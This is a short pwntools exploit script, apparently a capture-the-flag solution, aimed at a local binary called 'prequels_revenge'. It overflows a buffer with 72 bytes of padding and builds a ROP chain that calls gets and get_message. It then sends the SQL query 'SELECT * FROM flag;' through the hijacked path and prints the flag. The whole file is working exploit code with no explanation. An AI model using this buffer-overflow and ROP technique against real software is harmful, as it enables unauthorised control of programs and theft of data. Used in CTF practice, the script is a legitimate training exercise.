from pwn import *

context.binary = elf = ELF("./prequels_revenge")

p = process()

r = ROP(elf)
r.raw(b"A" * 72) # padding

r.gets(elf.bss())
r.get_message(elf.bss())

p.sendline(r.chain())
p.sendline(b"SELECT * FROM flag;")
p.recvuntil(b"Failed to bind text: column index out of range\n")

flag = p.recvline().decode()
log.success("Got flag: " + flag)